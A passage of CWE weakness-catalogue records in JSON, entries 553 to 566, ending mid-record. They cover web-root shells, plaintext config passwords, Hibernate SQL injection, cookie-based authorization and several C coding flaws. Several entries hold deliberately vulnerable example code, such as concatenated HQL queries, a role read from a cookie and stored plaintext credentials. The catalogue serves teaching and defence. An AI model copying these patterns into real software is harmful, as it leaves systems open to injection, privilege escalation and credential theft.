{"ID": "553", "Name": "Command Shell in Externally Accessible Directory", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "A possible shell file exists in /cgi-bin/ or other accessible directories. This is extremely dangerous and can be used by an attacker to execute commands on the web server.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "552", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"]}], "PotentialMitigations": [{"Phase": ["Installation", "System Configuration"], "Description": "Remove any Shells accessible under the web root folder and children directories."}], "RelatedAttackPatterns": ["650"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "554", "Name": "ASP.NET Misconfiguration: Not Using Input Validation Framework", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The ASP.NET application does not use an input validation framework.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1173", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "ASP.NET", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Unexpected State"], "Note": "Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others."}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "\n\nUse the ASP.NET validation framework to check all program input before it is processed by the application. Example uses of the validation framework include checking to ensure that:\n\n\n  - Phone number fields contain only valid characters in phone numbers\n\n  - Boolean values are only \"T\" or \"F\"\n\n  - Free-form strings are of a reasonable length and composition\n\n"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "555", "Name": "J2EE Misconfiguration: Plaintext Password in Configuration File", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The J2EE application stores a plaintext password in a configuration file.", "ExtendedDescription": "Storing a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resource, making it an easy target for attackers.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "260", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Do not hardwire passwords into your software."}, {"Phase": ["Architecture and Design"], "Description": "Use industry standard libraries to encrypt passwords before storage in configuration files."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "Below is a snippet from a Java properties file in which the LDAP server password is stored in plaintext."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\twebapp.ldap.username=secretUsername\n\twebapp.ldap.password=secretPassword\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "556", "Name": "ASP.NET Misconfiguration: Use of Identity Impersonation", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "Configuring an ASP.NET application to run with impersonated credentials may give the application unnecessary privileges.", "ExtendedDescription": "The use of impersonated credentials allows an ASP.NET application to run with either the privileges of the client on whose behalf it is executing or with arbitrary privileges granted in its configuration.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "266", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Use the least privilege principle."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "558", "Name": "Use of getlogin() in Multithreaded Application", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product uses the getlogin() function in a multithreaded context, potentially causing it to return incorrect values.", "ExtendedDescription": "The getlogin() function returns a pointer to a string that contains the name of the user associated with the calling process. The function is not reentrant, meaning that if it is called from another process, the contents are not locked out and the value of the string can be changed by another process. This makes it very risky to use because the username can be changed by other processes, so the results of the function cannot be trusted.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "663", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity", "Access Control", "Other"], "Impact": ["Modify Application Data", "Bypass Protection Mechanism", "Other"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Using names for security purposes is not advised. Names are easy to forge and can have overlapping user IDs, potentially causing confusion or impersonation."}, {"Phase": ["Implementation"], "Description": "Use getlogin_r() instead, which is reentrant, meaning that other processes are locked out from changing the username."}], "DemonstrativeExamples": [{"ID": "DX-172", "Entries": [{"IntroText": "The following code relies on getlogin() to determine whether or not a user is trusted. It is easily subverted."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tpwd = getpwnam(getlogin());\n\tif (isTrustedGroup(pwd->pw_gid)) {\n\t\tallow();\n\t} else {\n\t\tdeny();\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "56", "Name": "Path Equivalence: 'filedir*' (Wildcard)", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product accepts path input in the form of asterisk wildcard ('filedir*') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "41", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "155", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Files or Directories", "Modify Files or Directories"]}], "PotentialMitigations": [{"MitigationID": "MIT-20", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."}], "ObservedExamples": [{"Reference": "CVE-2004-0696", "Description": "List directories using desired path and \"*\"", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0696"}, {"Reference": "CVE-2002-0433", "Description": "List files in web server using \"*.ext\"", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0433"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "560", "Name": "Use of umask() with chmod-style Argument", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product calls umask() with an incorrect argument that is specified as if it is an argument to chmod().", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "687", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Access Control"], "Impact": ["Read Files or Directories", "Modify Files or Directories", "Bypass Protection Mechanism"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Use umask() with the correct argument."}, {"Phase": ["Testing"], "Description": "If you suspect misuse of umask(), you can use grep to spot call instances of umask()."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Other", "Note": "Some umask() manual pages begin with the false statement: \"umask sets the umask to mask & 0777\" Although this behavior would better align with the usage of chmod(), where the user provided argument specifies the bits to enable on the specified file, the behavior of umask() is in fact opposite: umask() sets the umask to ~mask & 0777. The documentation goes on to describe the correct usage of umask(): \"The umask is used by open() to set initial file permissions on a newly-created file. Specifically, permissions in the umask are turned off from the mode argument to open(2) (so, for example, the common umask default value of 022 results in new files being created with permissions 0666 & ~022 = 0644 = rw-r--r-- in the usual case where the mode is specified as 0666).\""}]}
{"ID": "561", "Name": "Dead Code", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product contains dead code, which can never be executed.", "ExtendedDescription": "Dead code is code that can never be executed in a running program. The surrounding code makes it impossible for a section of code to ever be executed.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1164", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Quality Degradation"], "Note": "Dead code that results from code that can never be executed is an indication of problems with the source code that needs to be fixed and is an indication of poor quality."}, {"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "DetectionMethods": [{"Method": "Architecture or Design Review", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAttack Modeling", "Effectiveness": "High"}, {"Method": "Automated Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tBinary / Bytecode Quality Analysis\n\t\tCompare binary / bytecode to application permission manifest", "Effectiveness": "High"}, {"Method": "Dynamic Analysis with Manual Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAutomated Monitored Execution", "Effectiveness": "SOAR Partial"}, {"Method": "Automated Static Analysis", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tPermission Manifest Analysis", "Effectiveness": "SOAR Partial"}, {"Method": "Automated Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tSource Code Quality Analyzer\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tWarning Flags\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer", "Effectiveness": "High"}, {"Method": "Dynamic Analysis with Automated Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tWeb Application Scanner\n\t\tWeb Services Scanner\n\t\tDatabase Scanners", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Remove dead code before deploying the application."}, {"Phase": ["Testing"], "Description": "Use a static analysis tool to spot dead code."}], "DemonstrativeExamples": [{"ID": "DX-217", "Entries": [{"IntroText": "The condition for the second if statement is impossible to satisfy. It requires that the variables be non-null. However, on the only path where s can be assigned a non-null value, there is a return statement."}, {"Nature": "Bad", "Language": "C++", "ExampleCode": "```\n\tString s = null;\n\tif (b) {\n\t\ts = \"Yes\";\n\t\treturn;\n\t}\n\tif (s != null) {\n\t\tDead();\n\t}\n```"}]}, {"Entries": [{"IntroText": "In the following class, two private methods call each other, but since neither one is ever invoked from anywhere else, they are both dead code."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class DoubleDead {\n\t\tprivate void doTweedledee() {\n\t\t\tdoTweedledumb();\n\t\t}\n\t\tprivate void doTweedledumb() {\n\t\t\tdoTweedledee();\n\t\t}\n\t\tpublic static void main(String[] args) {\n\t\t\tSystem.out.println(\"running DoubleDead\");\n\t\t}\n\t}\n```"}, {"BodyText": "(In this case it is a good thing that the methods are dead: invoking either one would cause an infinite loop.)"}]}, {"Entries": [{"IntroText": "The field named glue is not used in the following class. The author of the class has accidentally put quotes around the field name, transforming it into a string constant."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class Dead {\n\t\t\tString glue;\n\t\t\tpublic String getGlue() {\n\t\t\t\treturn \"glue\";\n\t\t\t}\n\t}\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2014-1266", "Description": "chain: incorrect \"goto\" in Apple SSL product bypasses certificate validation, allowing Adversary-in-the-Middle (AITM) attack (Apple \"goto fail\" bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint).", "Link": "https://www.cve.org/CVERecord?id=CVE-2014-1266"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "562", "Name": "Return of Stack Variable Address", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "A function returns the address of a stack variable, which will cause unintended program behavior, typically in the form of a crash.", "ExtendedDescription": "Because local variables are allocated on the stack, when a program returns a pointer to a local variable, it is returning a stack address. A subsequent function call is likely to re-use this same stack address, thereby overwriting the value of the pointer, which no longer corresponds to the same variable since a function's stack frame is invalidated when it returns. At best this will cause the value of the pointer to change unexpectedly. In many cases it causes the program to crash the next time the pointer is dereferenced.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "758", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "672", "ViewID": "1000"}, {"Nature": "CanPrecede", "CweID": "825", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}, {"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Availability", "Integrity", "Confidentiality"], "Impact": ["Read Memory", "Modify Memory", "Execute Unauthorized Code or Commands", "DoS: Crash, Exit, or Restart"], "Note": "If the returned stack buffer address is dereferenced after the return, then an attacker may be able to modify or read memory, depending on how the address is used. If the address is used for reading, then the address itself may be exposed, or the contents that the address points to. If the address is used for writing, this can lead to a crash and possibly code execution."}], "DetectionMethods": [{"DetectionMethodID": "DM-13", "Method": "Fuzzing", "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.", "Effectiveness": "High"}, {"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Testing"], "Description": "Use static analysis tools to spot return of the address of a stack variable."}], "DemonstrativeExamples": [{"ID": "DX-203", "Entries": [{"IntroText": "The following function returns a stack address."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tchar* getName() {\n\t\tchar name[STR_MAX];\n\t\tfillInName(name);\n\t\treturn name;\n\t}\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "563", "Name": "Assignment to Variable without Use", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The variable's value is assigned but never used, making it a dead store.", "ExtendedDescription": "After the assignment, the variable is either assigned another value or goes out of scope. It is likely that the variable is simply vestigial, but it is also possible that the unused variable points out a bug.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1164", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "AlternateTerms": [{"Term": "Unused Variable"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Quality Degradation", "Varies by Context"], "Note": "This weakness could be an indication of a bug in the program or a deprecated variable that was not removed and is an indication of poor quality. This could lead to further bugs and the introduction of weaknesses."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Remove unused variables from the code."}], "DemonstrativeExamples": [{"ID": "DX-218", "Entries": [{"IntroText": "The following code excerpt assigns to the variable r and then overwrites the value without using it."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tr = getName();\n\tr = getNewBuffer(buf);\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "564", "Name": "SQL Injection: Hibernate", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "Using Hibernate to execute a dynamic SQL statement built with user-controlled input can allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "89", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "89", "ViewID": "928", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "89", "ViewID": "1305", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Application Data", "Modify Application Data"]}], "PotentialMitigations": [{"Phase": ["Requirements"], "Description": "A non-SQL style database which is not subject to this flaw may be chosen."}, {"Phase": ["Architecture and Design"], "Description": "Follow the principle of least privilege when creating user accounts to a SQL database. Users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data."}, {"MitigationID": "MIT-15", "Phase": ["Architecture and Design"], "Description": "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."}, {"Phase": ["Implementation"], "Description": "Implement SQL strings using prepared statements that bind variables. Prepared statements that do not bind variables can be vulnerable to attack."}, {"Phase": ["Implementation"], "Description": "Use vigorous allowlist style checking on any user input that may be used in a SQL command. Rather than escape meta-characters, it is safest to disallow them entirely. Reason: Later use of data that have been entered in the database may neglect to escape meta-characters before use. Narrowly define the set of safe characters based on the expected value of the parameter in the request."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following code excerpt uses Hibernate's HQL syntax to build a dynamic query that's vulnerable to SQL injection."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tString street = getStreetFromUser();\n\tQuery query = session.createQuery(\"from Address a where a.street='\" + street + \"'\");\n```"}]}], "RelatedAttackPatterns": ["109"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "565", "Name": "Reliance on Cookies without Validation and Integrity Checking", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.", "ExtendedDescription": "Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as SQL injection and cross-site scripting, or otherwise modify inputs in unexpected ways.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "642", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "669", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "602", "ViewID": "1000"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity"], "Note": "It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to escalate an attacker's privileges to an administrative level."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Avoid using cookie data for a security-related decision."}, {"Phase": ["Implementation"], "Description": "Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision."}, {"Phase": ["Architecture and Design"], "Description": "Add integrity checks to detect tampering."}, {"Phase": ["Architecture and Design"], "Description": "Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client."}], "DemonstrativeExamples": [{"ID": "DX-61", "Entries": [{"IntroText": "The following code excerpt reads a value from a browser cookie to determine the role of the user."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tCookie[] cookies = request.getCookies();\n\tfor (int i =0; i< cookies.length; i++) {\n\t\tCookie c = cookies[i];\n\t\tif (c.getName().equals(\"role\")) {\n\t\t\tuserRole = c.getValue();\n\t\t}\n\t}\n```"}, {"BodyText": "It is easy for an attacker to modify the \"role\" value found in the locally stored cookie, allowing privilege escalation."}]}], "ObservedExamples": [{"Reference": "CVE-2008-5784", "Description": "e-dating application allows admin privileges by setting the admin cookie to 1.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5784"}], "RelatedAttackPatterns": ["226", "31", "39"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "This problem can be primary to many types of weaknesses in web applications. A developer may perform proper validation against URL parameters while assuming that attackers cannot modify cookies. As a result, the program might skip basic input validation to enable cross-site scripting, SQL injection, price tampering, and other attacks.."}], "Top25Examples": [{"Reference": "CVE-2022-1148", "Description": "Improper authorization in GitLab Pages included with GitLab CE/EE affecting all versions from 11.5 prior to 14.7.7, 14.8 prior to 14.8.5, and 14.9 prior to 14.9.2 allowed an attacker to steal a user's access token on an attacker-controlled private GitLab Pages website and reuse that token on the victim's other private websites"}]}
{"ID": "566", "Name": "Authorization Bypass Through User-Controlled SQL Primary Key", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses a database table that includes records that should not be accessible to an actor, but it executes a SQL statement with a primary key that can be controlled by that actor.", "ExtendedDescription": "\n\nWhen a user can set a primary key to any value, then the user can modify the key to point to unauthorized records.\n\n\nDatabase access control errors occur when:\n\n\n  - Data enters a program from an untrusted source.\n\n  - The data is used to specify the value of a primary key in a SQL query.\n\n  - The untrusted source does not have the permissions to be able to access all rows in the associated table.\n\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "639", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Technology", "Name": "Database Server", "Prevalence": "Often"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Access Control"], "Impact": ["Read Application Data", "Modify Application Data", "Bypass Protection Mechanism"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Assume all input is malicious. Use a standard input validation mechanism to validate all input for length, type, syntax, and business rules before accepting the data. Use an \"accept known good\" validation strategy."}, {"Phase": ["Implementation"], "Description": "Use a parameterized query AND make sure that the accepted values conform to the business rules. Construct your SQL statement accordingly."}], "DemonstrativeExamples": [{"ID": "DX-195", "Entries": [{"IntroText": "The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user."}, {"Nature": "Bad", "Language": "C#", "ExampleCode": "```\n\t...\n\t conn = new SqlConnection(_ConnectionString);\n\t conn.Open();\n\t int16 id = System.Convert.ToInt16(invoiceID.Text);\n\t SqlCommand query = new SqlCommand( \"SELECT * FROM invoices WHERE id = @id\", conn);\n\t query.Parameters.AddWithValue(\"@id\", id);\n\t SqlDataReader objReader = objCommand.ExecuteReader();\n\t ... \n```"}, {"BodyText": "The problem is that the developer has not considered all of the possible values of id. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", 